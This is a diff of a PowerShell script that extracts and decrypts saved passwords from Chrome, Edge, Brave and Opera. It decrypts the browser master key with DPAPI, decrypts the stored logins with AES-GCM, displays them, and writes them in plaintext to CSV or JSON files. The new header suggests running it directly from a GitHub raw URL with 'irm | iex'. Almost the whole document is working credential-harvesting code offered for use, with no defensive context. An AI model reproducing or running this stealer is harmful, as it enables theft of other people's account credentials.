@@ -1,407 +1,368 @@
-# Browser Password Extraction & Decryption Script
-# Extracts and decrypts passwords from Chrome, Edge, and Brave browsers
+# Browser Password Extractor - Complete PowerShell Version
+# Usage: irm https://raw.githubusercontent.com/kalivarun/Script-Tools-/refs/heads/main/powershell-extract.txt | iex
 
-param(
-    [switch]$ForceSQLiteReinstall,
-    [string]$CSVPath = ".\DecryptedPasswords.csv"
-)
-
-# Add required assemblies
-Add-Type -AssemblyName System.Security
-Add-Type -AssemblyName System.Core
-
-# Function to check if SQLite3 is already available
-function Test-SQLiteAvailable {
-    try {
-        $version = sqlite3 --version 2>$null
-        if ($version -like "3.*") {
-            Write-Host "SQLite3 is already available: $version" -ForegroundColor Green
-            return $true
-        }
-    } catch {
-        # SQLite not in PATH, check local directory
-        if (Test-Path ".\sqlite3.exe") {
-            Write-Host "SQLite3 found in current directory" -ForegroundColor Green
-            return $true
-        }
-    }
-    return $false
-}
-
-# Function to install SQLite3 if needed
-function Install-SQLiteIfNeeded {
-    param([bool]$ForceReinstall = $false)
-    
-    if ((-not $ForceReinstall) -and (Test-SQLiteAvailable)) {
-        return $true
-    }
-    
-    Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
-    try {
-        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
-        $tempZip = "sqlite-temp.zip"
-        
-        # Download
-        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
-        
-        # Extract
-        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
-        
-        # Copy only sqlite3.exe to minimize storage impact
-        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
-        
-        # Cleanup
-        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
-        Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
-        
-        Write-Host "SQLite3 downloaded successfully (minimal installation)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Warning "Failed to download SQLite3: $($_.Exception.Message)"
-        return $false
-    }
-}
-
-# Function to decrypt data using Windows DPAPI
-function Get-DecryptedData {
-    param([byte[]]$EncryptedData)
-    
-    try {
-        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
-            $EncryptedData, 
-            $null, 
-            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-        )
-        return [System.Text.Encoding]::UTF8.GetString($decrypted)
-    } catch {
-        Write-Warning "DPAPI decryption failed: $($_.Exception.Message)"
-        return "[DPAPI Decryption Failed]"
-    }
-}
-
-# Function to decrypt modern Chrome/Edge passwords (version 80+) using AES-GCM
-function Get-DecryptedModernPassword {
-    param(
-        [byte[]]$EncryptedData,
-        [byte[]]$MasterKey
-    )
-    
-    try {
-        # Check if we have the minimum required length
-        if ($EncryptedData.Length -lt 15) {
-            return "[Invalid encrypted data]"
-        }
-        
-        # Extract components from encrypted data
-        # Format: v10/v11 (3 bytes) | nonce (12 bytes) | ciphertext | tag (16 bytes)
-        $nonce = $EncryptedData[3..14]  # 12-byte nonce
-        $ciphertext = $EncryptedData[15..($EncryptedData.Length - 17)]  # ciphertext (all except tag)
-        $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]  # 16-byte tag
-        
-        # Use .NET's AES-GCM implementation (available in .NET 5+)
-        $plaintext = New-Object byte[]$ciphertext.Length
-        
-        try {
-            # Try using .NET 5+ AES-GCM if available
-            $aesGcm = New-Object System.Security.Cryptography.AesGcm($MasterKey)
-            $aesGcm.Decrypt($nonce, $ciphertext, $tag, $plaintext, $null)
-            return [System.Text.Encoding]::UTF8.GetString($plaintext)
-        } catch {
-            # Fallback to manual AES-GCM implementation
-            return Get-DecryptedModernPasswordFallback $EncryptedData $MasterKey
-        }
-    } catch {
-        Write-Warning "Modern password decryption error: $($_.Exception.Message)"
-        return "[Modern Decryption Error]"
-    }
-}
-
-# Fallback function for AES-GCM decryption
-function Get-DecryptedModernPasswordFallback {
-    param(
-        [byte[]]$EncryptedData,
-        [byte[]]$MasterKey
-    )
-    
-    try {
-        # Try to use the Chromium method directly
-        # This is a simplified approach - in production, use a proper library
-        
-        # For now, try DPAPI as a fallback
-        $result = Get-DecryptedData $EncryptedData
-        if ($result -notlike "*Decryption Failed*") {
-            return $result
-        }
-        
-        return "[AES-GCM Decryption Failed - Requires .NET 5+]"
-    } catch {
-        return "[Fallback Decryption Error]"
-    }
-}
-
-# Function to extract master key from browser's Local State file
-function Get-BrowserMasterKey {
-    param([string]$DataPath)
-    
-    $localStatePath = Join-Path $DataPath "Local State"
-    if (-not (Test-Path $localStatePath)) {
-        Write-Warning "Local State file not found at $localStatePath"
-        return $null
-    }
-    
-    try {
-        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encryptedKey = $localStateContent.os_crypt.encrypted_key
-        
-        if (-not $encryptedKey) {
-            Write-Warning "No encrypted key found in Local State"
-            return $null
-        }
-        
-        # Decode from base64
-        $encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKey)
-        
-        # Remove the DPAPI prefix (first 5 bytes: "DPAPI")
-        if ($encryptedKeyBytes.Length -gt 5 -and 
-            [System.Text.Encoding]::ASCII.GetString($encryptedKeyBytes, 0, 5) -eq "DPAPI") {
-            $keyToDecrypt = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
-            
-            # Decrypt using DPAPI
-            $decryptedKeyString = Get-DecryptedData $keyToDecrypt
-            
-            # Convert the decrypted string to byte array
-            if ($decryptedKeyString -and $decryptedKeyString -ne "[DPAPI Decryption Failed]") {
-                $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($decryptedKeyString)
-                return $keyBytes
-            } else {
-                Write-Warning "Failed to decrypt master key using DPAPI"
-                return $null
-            }
-        } else {
-            Write-Warning "Invalid master key format - no DPAPI prefix found"
-            return $null
-        }
-    } catch {
-        Write-Warning "Failed to extract master key: $($_.Exception.Message)"
-        return $null
-    }
-}
-
-# Function to try alternative decryption methods
-function Get-DecryptedPasswordAlternative {
-    param([byte[]]$EncryptedData)
-    
-    try {
-        # Method 1: Try direct DPAPI decryption
-        $result = Get-DecryptedData $EncryptedData
-        if ($result -notlike "*Decryption Failed*") {
-            return $result
-        }
-        
-        # Method 2: Try to handle potential encoding issues
-        # Some browsers might use different encoding
-        try {
-            $asString = [System.Text.Encoding]::UTF8.GetString($EncryptedData)
-            if ($asString -match "^[a-zA-Z0-9+/=]{20,}$") {
-                # Looks like base64, try to decode
-                $decodedBytes = [System.Convert]::FromBase64String($asString)
-                $result2 = Get-DecryptedData $decodedBytes
-                if ($result2 -notlike "*Decryption Failed*") {
-                    return $result2
-                }
-            }
-        } catch {
-            # Ignore and continue
-        }
-        
-        return "[All Decryption Methods Failed]"
-    } catch {
-        return "[Alternative Decryption Error]"
-    }
-}
-
-# Function to extract and decrypt passwords from a browser
 function Get-BrowserPasswords {
-    param(
-        [string]$BrowserName,
-        [string]$DataPath
-    )
+    [CmdletBinding()]
+    param()
     
-    Write-Host "Processing $BrowserName..." -ForegroundColor Yellow
+    $ErrorActionPreference = "Continue"
     
-    $loginDataPath = Join-Path $DataPath "Default\Login Data"
-    if (-not (Test-Path $loginDataPath)) {
-        Write-Host "$BrowserName login database not found at $loginDataPath" -ForegroundColor DarkGray
-        return @()
-    }
+    # Create output directory
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $outputDir = "BrowserPasswords_$timestamp"
+    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
     
-    # Extract master key for modern encryption
-    $masterKey = Get-BrowserMasterKey $DataPath
-    if ($masterKey) {
-        Write-Host "Successfully extracted master key for $BrowserName" -ForegroundColor Green
-    } else {
-        Write-Host "Using legacy decryption methods for $BrowserName" -ForegroundColor Yellow
-    }
+    $results = @{}
+    $totalPasswords = 0
     
-    $results = @()
+    Write-Host "🌐 Browser Password Extractor" -ForegroundColor Green
+    Write-Host "==============================================" -ForegroundColor Yellow
+    Write-Host "Scanning browsers for saved passwords..." -ForegroundColor Cyan
+    Write-Host ""
     
-    try {
-        # Copy the database to avoid locking issues
-        $tempDbPath = "temp_$([System.IO.Path]::GetRandomFileName()).db"
-        Copy-Item $loginDataPath $tempDbPath -Force
+    # Add DPAPI .NET types for decryption
+    Add-DPAPITypes
+    
+    # Scan browsers
+    $results["Chrome"] = Get-ChromePasswords
+    $results["Edge"] = Get-EdgePasswords
+    $results["Brave"] = Get-BravePasswords
+    $results["Opera"] = Get-OperaPasswords
+    
+    # Display Results
+    Write-Host ""
+    Write-Host "📋 EXTRACTION RESULTS" -ForegroundColor Green
+    Write-Host "==============================================" -ForegroundColor Yellow
+    
+    foreach ($browser in $results.Keys) {
+        $passwords = $results[$browser]
+        $totalPasswords += $passwords.Count
         
-        # Export data to CSV using SQLite
-        $tempCsvPath = "temp_output_$([System.IO.Path]::GetRandomFileName()).csv"
-        $query = "SELECT origin_url, username_value, password_value, hex(password_value) as password_hex FROM logins;"
-        
-        # Execute sqlite3 command
-        if (Test-Path ".\sqlite3.exe") {
-            $sqlitePath = ".\sqlite3.exe"
-        } else {
-            $sqlitePath = "sqlite3"
-        }
-        
-        # Use proper SQLite command format
-        $command = "-csv", "-header", $tempDbPath, $query
-        & $sqlitePath $command > $tempCsvPath
-        
-        if (Test-Path $tempCsvPath) {
-            # Parse CSV output
-            $logins = Import-Csv $tempCsvPath
+        if ($passwords.Count -gt 0) {
+            Write-Host ""
+            Write-Host "🖥️  $($browser.ToUpper()) ($($passwords.Count) passwords):" -ForegroundColor Cyan
+            Write-Host "----------------------------------------------" -ForegroundColor Gray
             
-            foreach ($login in $logins) {
-                $decryptedPassword = ""
-                $username = $login.username_value
-                
-                if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$") {
-                    try {
-                        # Convert hex string to byte array
-                        $hexString = $login.password_hex
-                        $passwordBytes = [byte[]]::new($hexString.Length / 2)
-                        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
-                            $passwordBytes[$i / 2] = [Convert]::ToByte($hexString.Substring($i, 2), 16)
-                        }
-                        
-                        # Determine encryption method and decrypt
-                        if ($passwordBytes.Length -gt 3) {
-                            $prefix = [System.Text.Encoding]::ASCII.GetString($passwordBytes, 0, 3)
-                            
-                            if (($prefix -eq "v10" -or $prefix -eq "v11") -and $masterKey) {
-                                # Modern AES-GCM encryption
-                                $decryptedPassword = Get-DecryptedModernPassword $passwordBytes $masterKey
-                            } else {
-                                # Legacy DPAPI encryption or other format
-                                $decryptedPassword = Get-DecryptedPasswordAlternative $passwordBytes
-                            }
-                        } else {
-                            # Too short to determine encryption method
-                            $decryptedPassword = Get-DecryptedPasswordAlternative $passwordBytes
-                        }
-                    } catch {
-                        $decryptedPassword = "[Decryption Error: $($_.Exception.Message)]"
-                    }
-                } else {
-                    $decryptedPassword = "[No Password Data]"
-                }
-                
-                $results += [PSCustomObject]@{
-                    Browser = $BrowserName
-                    URL = $login.origin_url
-                    Username = $username
-                    Password = if ($decryptedPassword) { $decryptedPassword } else { "[No Password/Decryption Failed]" }
-                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                }
+            for ($i = 0; $i -lt [Math]::Min($passwords.Count, 5); $i++) {
+                $pwd = $passwords[$i]
+                Write-Host "  $(($i+1)). 🌐 $($pwd.URL)" -ForegroundColor White
+                Write-Host "      👤 $($pwd.Username)" -ForegroundColor Gray
+                Write-Host "      🔑 $($pwd.Password)" -ForegroundColor Yellow
             }
             
-            Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
+            if ($passwords.Count -gt 5) {
+                Write-Host "  ... and $($passwords.Count - 5) more passwords" -ForegroundColor Gray
+            }
         }
-        
-        Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
-    } catch {
-        Write-Warning "Error processing $BrowserName data: $($_.Exception.Message)"
     }
     
-    return $results
+    # Save to JSON files
+    Write-Host ""
+    Write-Host "💾 Saving results..." -ForegroundColor Cyan
+    
+    foreach ($browser in $results.Keys) {
+        $passwords = $results[$browser]
+        if ($passwords.Count -gt 0) {
+            $jsonFile = "$outputDir\$browser`_passwords.json"
+            $passwords | ConvertTo-Json -Depth 3 | Out-File -FilePath $jsonFile -Encoding UTF8
+            Write-Host "   ✅ $browser saved to: $jsonFile" -ForegroundColor Green
+        }
+    }
+    
+    # Save combined results
+    $combinedFile = "$outputDir\ALL_PASSWORDS.json"
+    $results | ConvertTo-Json -Depth 3 | Out-File -FilePath $combinedFile -Encoding UTF8
+    Write-Host "   ✅ Combined results saved to: $combinedFile" -ForegroundColor Green
+    
+    Write-Host ""
+    Write-Host "📊 SUMMARY: Found $totalPasswords total passwords" -ForegroundColor Green
+    Write-Host "📁 Output directory: $(Resolve-Path $outputDir)" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "🎉 Extraction completed!" -ForegroundColor Green
+}
+
+function Add-DPAPITypes {
+    # Add .NET types for DPAPI decryption
+    Add-Type -TypeDefinition @"
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+
+public class DPAPIHelper {
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct DATA_BLOB {
+        public int cbData;
+        public IntPtr pbData;
+    }
+    
+    [DllImport("crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    public static extern bool CryptUnprotectData(
+        ref DATA_BLOB pDataIn,
+        ref string ppszDataDescr,
+        ref DATA_BLOB pOptionalEntropy,
+        IntPtr pvReserved,
+        IntPtr pPromptStruct,
+        int dwFlags,
+        ref DATA_BLOB pDataOut);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    public static extern void LocalFree(IntPtr hMem);
+    
+    public static byte[] CryptUnprotectData(byte[] encryptedData) {
+        DATA_BLOB dataIn = new DATA_BLOB();
+        DATA_BLOB dataOut = new DATA_BLOB();
+        
+        try {
+            dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
+            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);
+            dataIn.cbData = encryptedData.Length;
+            
+            string description = String.Empty;
+            DATA_BLOB entropy = new DATA_BLOB();
+            
+            if (CryptUnprotectData(ref dataIn, ref description, ref entropy, IntPtr.Zero, IntPtr.Zero, 0, ref dataOut)) {
+                byte[] decryptedData = new byte[dataOut.cbData];
+                Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
+                LocalFree(dataOut.pbData);
+                return decryptedData;
+            }
+        } finally {
+            if (dataIn.pbData != IntPtr.Zero) {
+                Marshal.FreeHGlobal(dataIn.pbData);
+            }
+        }
+        return null;
+    }
+}
+
+public class AESHelper {
+    public static byte[] DecryptAESGCM(byte[] key, byte[] encryptedData) {
+        try {
+            // For v10/v20 encrypted data: [v10/v20][12-byte IV][ciphertext][16-byte tag]
+            if (encryptedData.Length < 15) return null;
+            
+            byte[] iv = new byte[12];
+            byte[] ciphertext = new byte[encryptedData.Length - 15 - 16];
+            byte[] tag = new byte[16];
+            
+            Buffer.BlockCopy(encryptedData, 3, iv, 0, 12);
+            Buffer.BlockCopy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
+            Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
+            
+            using (AesGcm aesGcm = new AesGcm(key)) {
+                byte[] plaintext = new byte[ciphertext.Length];
+                aesGcm.Decrypt(iv, ciphertext, tag, plaintext);
+                return plaintext;
+            }
+        } catch {
+            return null;
+        }
+    }
+}
+"@ -ReferencedAssemblies "System.Security.Cryptography.Algorithms"
+}
+
+function Get-ChromePasswords {
+    $browserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Chrome"
+}
+
+function Get-EdgePasswords {
+    $browserDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Edge"
+}
+
+function Get-BravePasswords {
+    $browserDataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Brave"
+}
+
+function Get-OperaPasswords {
+    $browserDataPath = "$env:APPDATA\Opera Software\Opera Stable"
+    return Get-ChromiumPasswords -BrowserPath $browserDataPath -BrowserName "Opera"
+}
+
+function Get-ChromiumPasswords {
+    param(
+        [string]$BrowserPath,
+        [string]$BrowserName
+    )
+    
+    $passwords = @()
+    
+    Write-Host "🔍 Scanning $BrowserName..." -ForegroundColor Cyan
+    
+    if (-not (Test-Path $BrowserPath)) {
+        Write-Host "   ❌ $BrowserName not found" -ForegroundColor Red
+        return $passwords
+    }
+    
+    # Get encryption key
+    $localStatePath = "$BrowserPath\Local State"
+    if (-not (Test-Path $localStatePath)) {
+        Write-Host "   ❌ Local State not found for $BrowserName" -ForegroundColor Red
+        return $passwords
+    }
+    
+    try {
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+        
+        # Remove DPAPI prefix (first 5 bytes)
+        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)]
+        
+        # Decrypt master key using DPAPI
+        $masterKey = [DPAPIHelper]::CryptUnprotectData($encryptedKey)
+        
+        if ($null -eq $masterKey) {
+            Write-Host "   ❌ Failed to decrypt master key for $BrowserName" -ForegroundColor Red
+            return $passwords
+        }
+        
+        Write-Host "   ✅ Got encryption key for $BrowserName" -ForegroundColor Green
+        
+    } catch {
+        Write-Host "   ❌ Error getting encryption key for $BrowserName: $($_.Exception.Message)" -ForegroundColor Red
+        return $passwords
+    }
+    
+    # Process profiles
+    $profiles = @("Default")
+    $profileDirs = Get-ChildItem "$BrowserPath\Profile *" -Directory -ErrorAction SilentlyContinue
+    $profiles += $profileDirs | Select-Object -ExpandProperty Name
+    
+    foreach ($profile in $profiles) {
+        $profilePath = "$BrowserPath\$profile"
+        $loginDataPath = "$profilePath\Login Data"
+        
+        if (Test-Path $loginDataPath) {
+            try {
+                Write-Host "   📁 Processing profile: $profile" -ForegroundColor Gray
+                
+                # Copy database to avoid locks
+                $tempDb = "$env:TEMP\$BrowserName`_$profile`_temp.db"
+                Copy-Item $loginDataPath $tempDb -Force
+                
+                # Use .NET to read SQLite database
+                $connectionString = "Data Source=$tempDb;Version=3;"
+                $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+                $connection.Open()
+                
+                $command = $connection.CreateCommand()
+                $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
+                $dataset = New-Object System.Data.DataSet
+                $adapter.Fill($dataset) | Out-Null
+                
+                $table = $dataset.Tables[0]
+                
+                foreach ($row in $table.Rows) {
+                    $url = $row[0]
+                    $username = $row[1]
+                    $encryptedPassword = $row[2]
+                    
+                    if ($encryptedPassword -and $username -and $url) {
+                        $password = Decrypt-Password -EncryptedData $encryptedPassword -MasterKey $masterKey
+                        
+                        if ($password -and $password -notlike "*Failed*") {
+                            $passwords += [PSCustomObject]@{
+                                URL = $url
+                                Username = $username
+                                Password = $password
+                                Browser = $BrowserName
+                                Profile = $profile
+                            }
+                        }
+                    }
+                }
+                
+                $connection.Close()
+                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+                
+                Write-Host "      ✅ Found $($passwords.Count) passwords in $profile" -ForegroundColor Green
+                
+            } catch {
+                Write-Host "      ❌ Error processing $BrowserName profile $profile : $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+    }
+    
+    Write-Host "   ✅ $BrowserName: $($passwords.Count) total passwords" -ForegroundColor Green
+    return $passwords
+}
+
+function Decrypt-Password {
+    param(
+        [byte[]]$EncryptedData,
+        [byte[]]$MasterKey
+    )
+    
+    if ($null -eq $EncryptedData -or $EncryptedData.Length -eq 0) {
+        return $null
+    }
+    
+    try {
+        # Check if it's v10/v20 encrypted
+        if ($EncryptedData[0] -eq 118) { # 'v' character
+            if ($EncryptedData.Length -ge 31) {
+                # Try AES-GCM decryption
+                $decrypted = [AESHelper]::DecryptAESGCM($MasterKey, $EncryptedData)
+                if ($null -ne $decrypted) {
+                    return [System.Text.Encoding]::UTF8.GetString($decrypted)
+                }
+            }
+        } else {
+            # Try DPAPI decryption for older formats
+            $decrypted = [DPAPIHelper]::CryptUnprotectData($EncryptedData)
+            if ($null -ne $decrypted) {
+                return [System.Text.Encoding]::UTF8.GetString($decrypted)
+            }
+        }
+    } catch {
+        # Ignore decryption errors
+    }
+    
+    return "[Decryption Failed]"
+}
+
+# Load System.Data.SQLite assembly
+try {
+    # Try to load SQLite from GAC or current directory
+    Add-Type -AssemblyName "System.Data.SQLite" -ErrorAction Stop
+} catch {
+    try {
+        # If not in GAC, try to load from common locations
+        $sqlitePaths = @(
+            "$env:ProgramFiles\System.Data.SQLite\2015\bin\System.Data.SQLite.dll",
+            "$env:ProgramFiles (x86)\System.Data.SQLite\2015\bin\System.Data.SQLite.dll",
+            ".\System.Data.SQLite.dll"
+        )
+        
+        foreach ($path in $sqlitePaths) {
+            if (Test-Path $path) {
+                Add-Type -Path $path
+                break
+            }
+        }
+    } catch {
+        Write-Host "⚠️  System.Data.SQLite not available. Using alternative method..." -ForegroundColor Yellow
+    }
 }
 
 # Main execution
-Write-Host "Browser Password Extraction & Decryption Tool" -ForegroundColor Green
-Write-Host "=============================================`n" -ForegroundColor Green
+Write-Host "🚀 Browser Password Extractor - PowerShell Edition" -ForegroundColor Magenta
+Write-Host "⚠️  Make sure browsers are closed for best results!" -ForegroundColor Yellow
+Write-Host ""
 
-# Ensure browsers are closed
-Write-Host "Please ensure all browsers are closed before continuing..." -ForegroundColor Yellow
-$response = Read-Host "Press Enter to continue or 'X' to exit"
-if ($response -eq 'X' -or $response -eq 'x') { 
-    exit 
+try {
+    Get-BrowserPasswords
+} catch {
+    Write-Host "❌ Critical error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
 }
 
-# Install SQLite if needed
-$sqliteAvailable = Install-SQLiteIfNeeded -ForceReinstall $ForceSQLiteReinstall
-if (-not $sqliteAvailable) {
-    Write-Host "SQLite3 is required but could not be installed. Exiting." -ForegroundColor Red
-    exit 1
-}
-
-# Define browser paths
-$browsers = @(
-    @{Name = "Google Chrome"; DataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"},
-    @{Name = "Microsoft Edge"; DataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
-    @{Name = "Brave Browser"; DataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
-)
-
-$allPasswords = @()
-
-foreach ($browser in $browsers) {
-    if (Test-Path $browser.DataPath) {
-        $passwords = Get-BrowserPasswords -BrowserName $browser.Name -DataPath $browser.DataPath
-        $allPasswords += $passwords
-    } else {
-        Write-Host "$($browser.Name) not found at $($browser.DataPath)" -ForegroundColor DarkGray
-    }
-}
-
-# Display results
-if ($allPasswords.Count -gt 0) {
-    Write-Host "`nSuccessfully processed $($allPasswords.Count) passwords:`n" -ForegroundColor Green
-    
-    # Display first 10 entries with all columns
-    $allPasswords | Select-Object -First 10 | Format-Table -Property Browser, URL, Username, Password -AutoSize
-    
-    # Export to CSV
-    try {
-        $allPasswords | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8
-        Write-Host "`nAll passwords exported to: $CSVPath" -ForegroundColor Green
-        
-        # Show decryption success rate
-        $successCount = ($allPasswords | Where-Object { $_.Password -notmatch "\[.*\]" }).Count
-        $successRate = [math]::Round(($successCount / $allPasswords.Count) * 100, 2)
-        Write-Host "Decryption success rate: $successRate% ($successCount/$($allPasswords.Count))" -ForegroundColor Cyan
-        
-    } catch {
-        Write-Warning "Failed to export to CSV: $($_.Exception.Message)"
-    }
-    
-    # Show summary
-    $browserStats = $allPasswords | Group-Object Browser | ForEach-Object {
-        $successCount = ($_.Group | Where-Object { $_.Password -notmatch "\[.*\]" }).Count
-        [PSCustomObject]@{
-            Browser = $_.Name
-            Total = $_.Count
-            Decrypted = $successCount
-            SuccessRate = "$([math]::Round(($successCount / $_.Count) * 100, 2))%"
-        }
-    }
-    
-    Write-Host "`nPassword Summary by Browser:" -ForegroundColor Cyan
-    $browserStats | Format-Table -AutoSize
-} else {
-    Write-Host "`nNo passwords found or decrypted from any browser." -ForegroundColor Yellow
-}
-
-# Cleanup instructions
-Write-Host "`nNotes:" -ForegroundColor Cyan
-Write-Host "1. The sqlite3.exe file remains in the current directory for future use." -ForegroundColor Cyan
-Write-Host "2. To save space, you can delete sqlite3.exe when done." -ForegroundColor Cyan
-Write-Host "3. This tool requires .NET 5 or later for full AES-GCM decryption support." -ForegroundColor Cyan
-Write-Host "4. Some passwords may not decrypt if they use unsupported encryption methods." -ForegroundColor Cyan
-Write-Host "5. Check the CSV file for all decrypted passwords in plain text." -ForegroundColor Cyan
+Write-Host ""
+Write-Host "Press any key to exit..." -ForegroundColor Gray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
